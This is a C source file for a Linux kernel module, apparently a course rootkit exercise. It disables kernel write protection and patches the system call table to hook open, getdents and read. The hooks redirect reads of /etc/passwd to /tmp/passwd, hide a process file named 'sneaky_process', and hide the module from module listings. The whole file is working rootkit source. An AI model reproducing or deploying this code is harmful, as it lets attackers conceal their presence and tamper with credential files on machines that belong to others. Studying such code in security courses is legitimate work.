#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>

MODULE_LICENSE("GPL");

// get param (the process pid)
char* pid_str;

module_param(pid_str, charp, 0000);
MODULE_PARM_DESC(pid_str, "PID as a string");

// ?? to make sure that the “struct linux_dirent” is interpreted correctly ??
struct linux_dirent {
  u64            d_ino;     // inode number
  s64            d_off;     // offset to next linux_dirent
  unsigned short d_reclen;  // linux_dirent length
  char           d_name[];  // null-terminated filename
}; 


//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81073190;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81073110;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00280;


//////////////////////////////
///   "open" system call
//////////////////////////////

// function ptr to original systen call "open" (token: __NR_open)
asmlinkage int (*sys_open) (const char *pathname, int flags);

// Define new "open"
asmlinkage int sneaky_open (const char *pathname, int flags)
{
  // if wants to call "open" on "/etc/passwd": substitue for "/tmp/passwd" instead!
  if (strcmp(pathname, "/etc/passwd") == 0) {
    copy_to_user((void *)pathname, "/tmp/passwd", 12); 
    // 12 = "/tmp/passwd"(11) + "\0"(1)
  }
  // return to the system "open"
  return sys_open(pathname, flags);
}


////////////////////////////
///  "getdents" system call
////////////////////////////

// function ptr for original call
asmlinkage int (*sys_getdents) (unsigned int fd,
				struct linux_dirent *dirp,
				unsigned int count);

// define new sneaky function
asmlinkage int sneaky_getdents (unsigned int fd,
				struct linux_dirent *dirp,
				unsigned int count) {
  // first call original getdents() to get all dirent structs
  int dirent_size = sys_getdents(fd, dirp, count);
  int examined_size = 0;
  int skipped_size = 0;

  //  printk("Get Dents!");

  // iterate through "dirp ",
  // skip: any dirent with filename == "sneaky_process"
  // the trick for "skip" is: memmove all the dirents that are un-examined to the location of the current dirent
  int offset; // ??? "forbids var declaration in for loop"??
  for (offset = 0; offset < (dirent_size - skipped_size);) {
    struct linux_dirent * ptr;
    ptr = (struct linux_dirent *) ((void*)dirp + offset);

    /* printk(">>"); */
    /* printk(ptr->d_name); */

    if (strcmp(ptr->d_name, "sneaky_process") == 0) {
      // ha! ISO C90 forbids mixed var declare & code !??
      void* unexamined_start;
      int unexamined_size;
      
      //printk("WWWWW Found!");
      
      skipped_size += ptr->d_reclen;

      unexamined_start = (void*)(ptr) + ptr->d_reclen;
      unexamined_size = dirent_size - skipped_size - examined_size;

      memmove(ptr,
    	      unexamined_start,
    	      unexamined_size);
      // offset stays the same here, do not update!
      
    } else {
      examined_size += ptr->d_reclen;
    
      // update offset here
      offset += ptr->d_reclen;
    }
  }
  
  return dirent_size - skipped_size;
}


////////////////////////////////
///  "read" system call
////////////////////////////////
asmlinkage ssize_t (*sys_read) (int fd, void *buf, size_t count);

ssize_t sneaky_read(int fd, void *buf, size_t count) {
  ssize_t read_size;

  // read using the system call
  read_size = sys_read(fd, buf, count);

  // try to locate "sneaky_mod" in the read result
  if (read_size >= 1) {
    char* ptr;
    ptr = strstr(buf, "sneaky_mod");

    if (ptr != NULL) { // if found: skip it
      char* ptr_nl;
      ptr_nl = strstr(ptr, "\n");  // find that whole line about the "sneaky_mod"
      if (ptr_nl != NULL) {
	int size_after_line;
	int size_of_line;
	
	size_of_line = (int)((void*)ptr_nl - (void*)ptr) + 1;
	size_after_line = read_size - size_of_line - (int)((void*)ptr - buf);

	memmove(ptr, (void*)ptr + size_of_line, size_after_line);
	read_size -= size_of_line;
      }
    }
  }
  return read_size;
}

////////////////////////////////
///  module load/unload routine
////////////////////////////////

//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  ///////////////////
  //  preparations
  ///////////////////
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  
  // Get ptr to sys_call_table
  page_ptr = (struct page *)virt_to_page(&sys_call_table);

  // Make this page read-write accessible
  pages_rw(page_ptr, 1);


  /////////////////////////////
  // change system call table
  /////////////////////////////

  // substitute "open" system call (token: __NR_open )
  sys_open = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_open;

  // substitute "getdents" system call (token: __NR_getdents )
  sys_getdents = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_getdents;

  // substitute "getdents" system call (token: __NR_read )
  sys_read = (void*)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_read;


  ////////////////////
  ///  clean-ups
  ////////////////////

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0; // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  ////////////////////
  ///  preparations
  ////////////////////
  
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  // get ptr to system call page
  page_ptr = (struct page *)virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);
  

  //////////////////////////////////////////////////////////////////////
  ///  recover system call table with saved original function pointers
  //////////////////////////////////////////////////////////////////////

  // recover original "open" system call (token: __NR_open )
  *(sys_call_table + __NR_open) = (unsigned long)sys_open;

  // recover original "getdents" system call (token: __NR_getdents )
  *(sys_call_table + __NR_getdents) = (unsigned long)sys_getdents;

  // recover original "read" system call (token: __NR_read )
  *(sys_call_table + __NR_read) = (unsigned long)sys_read;

  
  /////////////////
  ///  clean-ups
  /////////////////
  
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  

